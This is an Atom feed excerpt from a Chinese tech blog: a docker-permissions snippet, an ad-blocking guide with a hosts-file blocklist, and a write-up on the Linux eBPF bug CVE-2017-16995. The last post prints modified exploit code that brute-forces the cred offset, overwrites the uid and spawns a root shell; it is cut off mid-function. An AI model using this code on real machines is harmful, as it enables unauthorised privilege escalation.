&lt;p&gt;随着docker越来越流行，很多公司内部linux机器上docker成了标配。&lt;/p&gt;
&lt;h2 id=&quot;免sudo使用docker&quot;&gt;&lt;a href=&quot;#免sudo使用docker&quot; class=&quot;headerlink&quot; title=&quot;免sudo使用docker&quot;&gt;&lt;/a&gt;免sudo使用docker&lt;/h2&gt;&lt;p&gt;默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限，如何保证普通用户也能顺利使用Docker呢？&lt;/p&gt;
&lt;p&gt;这一点想必难不到大家，只需要管理员将需要使用docker的用户&lt;code&gt;添加到docker用户组&lt;/code&gt;(安装docker后默认会创建该组)中，用户重新登录机器即可&lt;code&gt;免sudo&lt;/code&gt;使用docker了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://blog.lxzh.app/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>优雅的过滤广告</title>
    <link href="http://blog.lxzh.app/2018/03/30/AdFilter-md/"/>
    <id>http://blog.lxzh.app/2018/03/30/AdFilter-md/</id>
    <published>2018-03-30T14:02:44.000Z</published>
    <updated>2019-11-06T18:21:07.949Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="广告过滤"><a href="#广告过滤" class="headerlink" title="广告过滤"></a>广告过滤</h1><p>最近在浏览网页的时候，感觉有些网站的广告真的很烦，一不好看影响视觉，二总在切图吸引注意力，三有些广告有点少儿不宜，于是琢磨该如何过滤广告呢？</p><p>起初这个想法源自于公司办公的时候。由于公司访问外网必须要配置代理，而在配置代理的地方有个高级设置，里面可以通过精确/模糊匹配的方式过滤一些网址，本来这个功能平时一直用于过滤公司内部的一些服务器或内部网址等，避免也走代理导致无法访问。</p><a id="more"></a><p>既然这功能能够过滤内网不走代理，那么是不是也可以过滤广告不走代理呢？</p><p>抱着试一试的心态，凭借着一点点网页调试的技能，抓到一个广告的网址(后面介绍如何抓广告网址)，将它的host地址塞到代理过滤列表里，保存，然后刷新网页，广告蹦不出来啦<del>嘚瑟～(￣▽￣～)(～￣▽￣)～嘚瑟</del><br>见下图：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1522419990947.png" width="940"></p><p>图1为本地代理设置入口，对于Windows系统一般很多浏览器的代理都可以配置使用Internet Explorer的代理，因此这里配置可以多其他浏览器都生效。图2中勾选”跳过本地地址的代理服务器”，点击”高级”按钮进入图3，在”例外情况”输入框中填入需要过滤的广告网址host。</p><blockquote><p>注：以上方法对于公司通过代理上外网有效。</p></blockquote><p>于是，又去几个有广告的页面，分别抓到他们的广告网址纷纷丢到过滤列表了，QND，有的网页同一个广告挂了三四个，哥全给你毙了，顿时网页清净多了~</p><h1 id="抓取网页中的广告链接"><a href="#抓取网页中的广告链接" class="headerlink" title="抓取网页中的广告链接"></a>抓取网页中的广告链接</h1><p>以下针对Chrome浏览器简单介绍，其他浏览器类似：</p><p>如图，CSDN博客左侧中与右下角的广告是我们本次的目标：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1522422416692.png" width="1500"></p><p>在 菜单》工具》开发者工具 打开<code>开发人员工具</code>辅助面板，依次展开里面的<code>body</code>以及多级<code>div</code>标签，在展开的过程中通过在不同的div移动，观察上面网页上浅蓝色蒙版当前定位，刚好盖在广告上时就说嘛找到了，从而快速找到是那个div下面有广告链接，如下图：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1522422659640.png" width="1500"><br>高亮的<code>div</code>即是我们要找的位置，注意到里面有个<code>src=//cee1.iteye.com/lgyyovfyh.js</code>的链接，OK，其中的<code>cee1.iteye.com</code>就是广告链接的<code>host</code>地址，依次类推，本页面右下角的广告host为<code>pos.baidu.com</code>。不过，本页面的作者比较厚道，代码中直接有注释<code>&lt;!--投放代码--&gt;</code>、<code>&lt;!--右下角弹窗广告--&gt;</code>，有助于快速找到广告的标签。</p><p>通过以上方式配合公司代理过滤，就可以达到过滤广告的目的，以后遇到一个抓一个，从此网页浏览一片清净~</p><h1 id="非公司网络如何过滤广告呢"><a href="#非公司网络如何过滤广告呢" class="headerlink" title="非公司网络如何过滤广告呢"></a>非公司网络如何过滤广告呢</h1><p>但是回到家，不需要公司代理，该如何过滤广告呢？用第三方软件、插件？难选！效果不佳！不靠谱！！！不靠谱！！！不靠谱！！！（<code>重要的事说三遍</code>）</p><p>搞一个代理服务器？太麻烦！</p><p>那该怎么办呢？</p><h2 id="改-hosts-翻墙（Idea借鉴）"><a href="#改-hosts-翻墙（Idea借鉴）" class="headerlink" title="改 hosts 翻墙（Idea借鉴）"></a>改 hosts 翻墙（Idea借鉴）</h2><p>想到以前没有代理又想用google的一点小技能：<code>改hosts访问google</code>，方法这里不介绍了，读者可自行网上搜一下。</p><p>这里copy一下<code>hosts的原理</code>(源于百度百科)：</p><blockquote><p>hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会<code>首先自动从Hosts文件中寻找对应的IP地址</code>，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<br>需要注意的是，Hosts文件配置的映射是<code>静态的</code>，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。</p></blockquote><p>概括一下就是手动给浏览器一个<code>域名—IP</code>的配置表，让它从配置中快速找到域名对应的IP地址，而不是去DNS服务器查找，从而直接访问目标服务器。</p><h2 id="改-hosts屏蔽广告"><a href="#改-hosts屏蔽广告" class="headerlink" title="改 hosts屏蔽广告"></a>改 hosts屏蔽广告</h2><p>既然我们可以通过改hosts<code>指引</code>浏览器去访问一个网站，那么也可以<code>&quot;误导&quot;</code>它，_告诉它一个错误的IP，让它<code>找不到广告服务器</code>，从而实现<code>屏蔽广告</code>的目的_。</p><h2 id="选误导IP"><a href="#选误导IP" class="headerlink" title="选误导IP"></a>选误导IP</h2><p>那么该告诉浏览器什么地址比较合适呢，这个就比较简单了，随便选一个不常用的IP，ping一下，ping不通就可以了，比如：1.1.1.1，2.2.2.2等等，随便啦！</p><h2 id="配置hosts"><a href="#配置hosts" class="headerlink" title="配置hosts"></a>配置hosts</h2><p>将上文中介绍的找到的广告host，配合选好的<code>错误的IP</code>地址填入系统hosts配置文件，格式如下，追加到hosts配置文件末尾，保存即可(<code>可能需要管理员权限</code>)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#百度</span><br><span class="line">127.0.0.1 cpro.baidu.com</span><br><span class="line">127.0.0.1 pos.baidu.com</span><br><span class="line">#ITeye</span><br><span class="line">127.0.0.1 cee1.iteye.com</span><br><span class="line"># google</span><br><span class="line">0.0.0.0 pagead2.googlesyndication.com</span><br></pre></td></tr></table></figure><p>如果有部分广告仍旧冒出来了，可尝试更换IP试试，本人试了0.0.0.0对于有些广告不管用，有些管用，不知为啥。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>一点小技巧，需要长期积累收集广告链接。另外对于一些应然软件中的广告，可能就需要一点网络抓包的技能了，这里就不展开了，祝上网愉快~</p><h1 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h1><h2 id="各系统hosts路径："><a href="#各系统hosts路径：" class="headerlink" title="各系统hosts路径："></a>各系统hosts路径：</h2><p>Windows：<code>C:\Windows\System32\drivers\etc\hosts</code><br>Linux：<code>/etc/hosts</code><br>macOS：<code>/etc/hosts</code></p><h2 id="网上搜集的一些广告链接："><a href="#网上搜集的一些广告链接：" class="headerlink" title="网上搜集的一些广告链接："></a>网上搜集的一些广告链接：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#AD Block Start</span><br><span class="line"></span><br><span class="line">#百度</span><br><span class="line">127.0.0.1 cpro.baidu.com</span><br><span class="line">127.0.0.1 pos.baidu.com</span><br><span class="line"></span><br><span class="line">#ITeye</span><br><span class="line">127.0.0.1 cee1.iteye.com</span><br><span class="line"></span><br><span class="line">#优酷</span><br><span class="line">0.0.0.0 valb.atm.youku.com</span><br><span class="line">0.0.0.0 vid.atm.youku.com</span><br><span class="line">0.0.0.0 valo.atm.youku.com</span><br><span class="line">0.0.0.0 valf.atm.youku.com</span><br><span class="line">0.0.0.0 walp.atm.youku.com</span><br><span class="line">0.0.0.0 static.atm.youku.com</span><br><span class="line">0.0.0.0 images.sohu.com</span><br><span class="line">127.0.0.1 atm.youku.com</span><br><span class="line">127.0.0.1 Fvid.atm.youku.com</span><br><span class="line">127.0.0.1 html.atm.youku.com</span><br><span class="line">127.0.0.1 static.atm.youku.com</span><br><span class="line">127.0.0.1 valb.atm.youku.com</span><br><span class="line">127.0.0.1 valc.atm.youku.com</span><br><span class="line">127.0.0.1 valf.atm.youku.com</span><br><span class="line">127.0.0.1 valo.atm.youku.com</span><br><span class="line">127.0.0.1 valp.atm.youku.com</span><br><span class="line">127.0.0.1 lstat.youku.com</span><br><span class="line">127.0.0.1 speed.lstat.youku.com</span><br><span class="line">127.0.0.1 urchin.lstat.youku.com</span><br><span class="line">127.0.0.1 stat.youku.com</span><br><span class="line">127.0.0.1 xnimg.cn</span><br><span class="line">127.0.0.1 techpowerup.com</span><br><span class="line">127.0.0.1 acs.agent.56.com</span><br><span class="line">127.0.0.1 acs.56.com</span><br><span class="line">127.0.0.1 gug.ku6cdn.com</span><br><span class="line">127.0.0.1 pcs1.app.joy.cn</span><br><span class="line">127.0.0.1 86file.megajoy.com</span><br><span class="line">127.0.0.1 video.gougou.com</span><br><span class="line">127.0.0.1 advstat.xunlei.com</span><br><span class="line">127.0.0.1 dl.xunlei.com</span><br><span class="line">127.0.0.1 i.xunlei.com</span><br><span class="line">127.0.0.1 kkpgv.xunlei.com</span><br><span class="line">127.0.0.1 mtips.xunlei.com</span><br><span class="line">127.0.0.1 pstatic.xunlei.com</span><br><span class="line">127.0.0.1 dynamic.kankan.xunlei.com</span><br><span class="line">127.0.0.1 js.kankan.xunlei.com</span><br><span class="line">127.0.0.1 statis.kankan.xunlei.com</span><br><span class="line">127.0.0.1 biz.sandai.net</span><br><span class="line">127.0.0.1 biz2.sandai.net</span><br><span class="line">127.0.0.1 biz3.sandai.net</span><br><span class="line">127.0.0.1 biz4.sandai.net</span><br><span class="line">127.0.0.1 biz5.sandai.net</span><br><span class="line">127.0.0.1 biz6.sandai.net</span><br><span class="line">127.0.0.1 mediapv.sandai.net</span><br><span class="line">127.0.0.1 mpv.sandai.net</span><br><span class="line">127.0.0.1 mcfg.sandai.net</span><br><span class="line">127.0.0.1 server1.adpolestar.net</span><br><span class="line">127.0.0.1 at-img1.tdimg.com</span><br><span class="line">127.0.0.1 at-img2.tdimg.com</span><br><span class="line">127.0.0.1 at-img3.tdimg.com</span><br><span class="line">127.0.0.1 at-img4.tdimg.com</span><br><span class="line">127.0.0.1 adextensioncontrol.tudou.com</span><br><span class="line">127.0.0.1 adcontrol.tudou.com</span><br><span class="line">127.0.0.1 union.mtime.cn</span><br><span class="line"></span><br><span class="line">#土豆</span><br><span class="line">0.0.0.0 *.p2v.tudou.com*</span><br><span class="line">0.0.0.0 at-img1.tdimg.com</span><br><span class="line">0.0.0.0 at-img2.tdimg.com</span><br><span class="line">0.0.0.0 at-img3.tdimg.com</span><br><span class="line">0.0.0.0 adplay.tudou.com</span><br><span class="line">0.0.0.0 adcontrol.tudou.com</span><br><span class="line">0.0.0.0 stat.tudou.com</span><br><span class="line"></span><br><span class="line">#酷六</span><br><span class="line">0.0.0.0 v2.stat.ku6.com</span><br><span class="line">0.0.0.0 v3.stat.ku6.com</span><br><span class="line">0.0.0.0 v0.stat.ku6.com</span><br><span class="line">0.0.0.0 v1.stat.ku6.com</span><br><span class="line">0.0.0.0 st.vq.ku6.cn</span><br><span class="line">0.0.0.0 stat2.888.ku6.com</span><br><span class="line">0.0.0.0 pq.stat.ku6.com</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">0.0.0.0 mcfg.sandai.net</span><br><span class="line">0.0.0.0 biz5.sandai.net</span><br><span class="line">0.0.0.0 server1.adpolestar.net</span><br><span class="line">0.0.0.0 advstat.xunlei.com</span><br><span class="line">0.0.0.0 mpv.sandai.net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># google</span><br><span class="line">0.0.0.0 pagead2.googlesyndication.com</span><br><span class="line">0.0.0.0 *.googleadsserving.cn</span><br><span class="line">0.0.0.0 static.googleadsserving.cn</span><br><span class="line">0.0.0.0 googlesyndication.com</span><br><span class="line">0.0.0.0 doubleclick.net</span><br><span class="line">0.0.0.0 googleads.g.doubleclick.net</span><br><span class="line">0.0.0.0 mcfg.sandai.net</span><br><span class="line">0.0.0.0 biz5.sandai.net</span><br><span class="line">0.0.0.0 server1.adpolestar.net</span><br><span class="line">0.0.0.0 advstat.xunlei.com</span><br><span class="line">0.0.0.0 mpv.sandai.net</span><br><span class="line"></span><br><span class="line">#google</span><br><span class="line">66.102.7.100 encrypted.google.com</span><br><span class="line">74.125.43.102 encrypted.google.com</span><br><span class="line">74.125.227.4 encrypted.google.com</span><br><span class="line"></span><br><span class="line">#56</span><br><span class="line">127.0.0.1 acs.56.com</span><br><span class="line">127.0.0.1 acs.agent.56.com</span><br><span class="line">127.0.0.1 bill.agent.56.com</span><br><span class="line">127.0.0.1 union.56.com</span><br><span class="line">127.0.0.1 v16.56.com</span><br><span class="line"></span><br><span class="line">#6间房</span><br><span class="line">127.0.0.1 simba.6.cn</span><br><span class="line">127.0.0.1 pole.6rooms.com</span><br><span class="line">127.0.0.1 shrek.6.cn</span><br><span class="line"></span><br><span class="line">#优酷</span><br><span class="line">127.0.0.1 stat.youku.com</span><br><span class="line">127.0.0.1 static.atm.youku.com</span><br><span class="line">127.0.0.1 static.lstat.youku.com</span><br><span class="line">127.0.0.1 valc.atm.youku.com</span><br><span class="line">127.0.0.1 valf.atm.youku.com</span><br><span class="line">127.0.0.1 valo.atm.youku.com</span><br><span class="line">127.0.0.1 valp.atm.youku.com</span><br><span class="line">127.0.0.1 vid.atm.youku.com</span><br><span class="line">127.0.0.1 walp.atm.youku.com</span><br><span class="line"></span><br><span class="line">#土豆</span><br><span class="line">127.0.0.1 adextensioncontrol.tudou.com</span><br><span class="line">127.0.0.1 adplay.tudou.com</span><br><span class="line">127.0.0.1 iwstat.tudou.com</span><br><span class="line">127.0.0.1 nstat.tudou.com</span><br><span class="line">127.0.0.1 stat.tudou.com</span><br><span class="line">127.0.0.1 stats.tudou.com</span><br><span class="line"></span><br><span class="line">#AD Block End</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;广告过滤&quot;&gt;&lt;a href=&quot;#广告过滤&quot; class=&quot;headerlink&quot; title=&quot;广告过滤&quot;&gt;&lt;/a&gt;广告过滤&lt;/h1&gt;&lt;p&gt;最近在浏览网页的时候，感觉有些网站的广告真的很烦，一不好看影响视觉，二总在切图吸引注意力，三有些广告有点少儿不宜，于是琢磨该如何过滤广告呢？&lt;/p&gt;
&lt;p&gt;起初这个想法源自于公司办公的时候。由于公司访问外网必须要配置代理，而在配置代理的地方有个高级设置，里面可以通过精确/模糊匹配的方式过滤一些网址，本来这个功能平时一直用于过滤公司内部的一些服务器或内部网址等，避免也走代理导致无法访问。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Little skill" scheme="http://blog.lxzh.app/tags/Little-skill/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995</title>
    <link href="http://blog.lxzh.app/2018/03/21/CVE-2017-16995/"/>
    <id>http://blog.lxzh.app/2018/03/21/CVE-2017-16995/</id>
    <published>2018-03-20T18:02:35.000Z</published>
    <updated>2019-11-06T18:21:07.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu本地提权初探"><a href="#Ubuntu本地提权初探" class="headerlink" title="Ubuntu本地提权初探"></a>Ubuntu本地提权初探</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个<strong>内存任意读写</strong>漏洞。该漏洞是由于<code>eBPF</code>验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。</p><a id="more"></a><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>原作者exp<a href="https://t.co/vXPrr33S7B" target="_blank" rel="noopener">此处</a>可下载(可能需要梯子，<a href="https://raw.githubusercontent.com/ljf1239848066/linux-kernel-exploits/master/CVE-2017-16995/upstream44.c" target="_blank" rel="noopener">这里</a>copy了一份)，然而直接运行，很多机器是无法提权成功的。</p><p>源代码注释头有说到:</p><blockquote><p>if different kernel adjust CRED offset + check kernel stack size</p></blockquote><p>针对这个魔鬼数字:CRED_OFFSET=<code>0x5f8</code></p><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1521564739929.png" alt="魔鬼数字:CRED_OFFSET"></p><p><a href="https://www.cnblogs.com/rebeyond/p/8603056.html#commentform" target="_blank" rel="noopener">这篇文章</a>也说明了真相：</p><blockquote><p>cred结构体的偏移量可能因为内核版本不同、内核编译选项不同而出现差异，作者给的exp偏移量是写死的</p></blockquote><p>此文作者也给出了一种应对之策：</p><h2 id="获取cred-offset常量（一）"><a href="#获取cred-offset常量（一）" class="headerlink" title="获取cred offset常量（一）"></a>获取cred offset常量（一）</h2><p>通过以下方法可获取这个<code>cred offset</code>:</p><h3 id="1、getCredOffset-c"><a href="#1、getCredOffset-c" class="headerlink" title="1、getCredOffset.c"></a>1、getCredOffset.c</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"[!]current cred offset:%x\n"</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;(current-&gt;cred)-(<span class="keyword">unsigned</span> <span class="keyword">long</span>)current);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"module cleanup\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、Makefile"><a href="#2、Makefile" class="headerlink" title="2、Makefile"></a>2、Makefile</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += getCredOffset.o</span><br><span class="line"> </span><br><span class="line">all:</span><br><span class="line">        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line">         </span><br><span class="line">clean:</span><br><span class="line">        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure><h3 id="3、编译"><a href="#3、编译" class="headerlink" title="3、编译"></a>3、编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="4、执行"><a href="#4、执行" class="headerlink" title="4、执行"></a>4、执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod getCredOffset.ko</span><br></pre></td></tr></table></figure><p>该命令需要有sudo权限的用户执行，通过<code>insmod</code>命令将<code>getCredOffset</code>模块注入内核</p><h3 id="5、获取cred-offset"><a href="#5、获取cred-offset" class="headerlink" title="5、获取cred offset"></a>5、获取cred offset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | grep "cred offset"</span><br></pre></td></tr></table></figure><p>另开一个命令行执行该命令即可获取到<code>cred offset</code>，最后替换掉原<code>exp</code>中的<code>偏移量</code>即可成功提权。</p><p>然而，虽提权成功了，但此法有点怪异，本来想普通用户提权，但却需要用root用户执行命令来协助，有点力不从心。</p><p>那么问题又来了，该如何在不同的机器上动态获取这个<code>cred offset</code>呢？</p><h2 id="获取cred-offset常量——暴力尝试"><a href="#获取cred-offset常量——暴力尝试" class="headerlink" title="获取cred offset常量——暴力尝试"></a>获取cred offset常量——暴力尝试</h2><p>经过上文作者的点拨：</p><blockquote><p>这个漏洞是个任意地址读写漏洞，所以也可以在确定task_struct地址之后，以当前用户的uid为特征去搜索内存，毕竟cred离task_struct不远。</p></blockquote><p>加上代码中有多处<code>__read</code>命令，以及<code>getuid()</code>命令，这两个命令都可以读取<code>uid</code>。首先想到的是在往<code>uidptr</code>对应的地址中写<code>0</code>之前获取此时的<code>uid</code>值，通过以上两种方式对比看有什么差异：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"uidptr      = %lx\n"</span>, uidptr);</span><br><span class="line">uid_get=getuid();</span><br><span class="line">uid_read=__read(uidptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"uid get=%lx,read=%lx\n"</span>,uid_get, uid_read);</span><br><span class="line"></span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/bash"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然如下图所示：</p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1521566656146.png" width="197">那么规律来了，我们可以尝试以不同的`cred offset`来获取两个`uid`来进行对比，一旦对比上，姑且就当做找到了这个“确定”的值，然后再去`write(0)`。修改`pwn`函数如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">uint64_t</span> credoffset)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> fp, sp, ts, credadd, credptr, uidptr, uid_get, uid_read;</span><br><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">"bogus fp"</span>);</span><br><span class="line"></span><br><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">"bogus sp"</span>);</span><br><span class="line"></span><br><span class="line">ts = __read(sp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ts &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">"bogus task ptr"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"task_struct = %lx\n"</span>, ts);</span><br><span class="line"></span><br><span class="line">uid_get=getuid();</span><br><span class="line"><span class="keyword">for</span>(credoffset=<span class="number">0x400</span>;credoffset&lt;<span class="number">0x800</span>;credoffset++)&#123;</span><br><span class="line">credadd=ts + credoffset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"credadd     = %lx\n"</span>, credadd);</span><br><span class="line">credptr = __read(credadd); <span class="comment">// cred</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"credptr     = %lx\n"</span>, credptr);</span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)&#123;</span><br><span class="line"><span 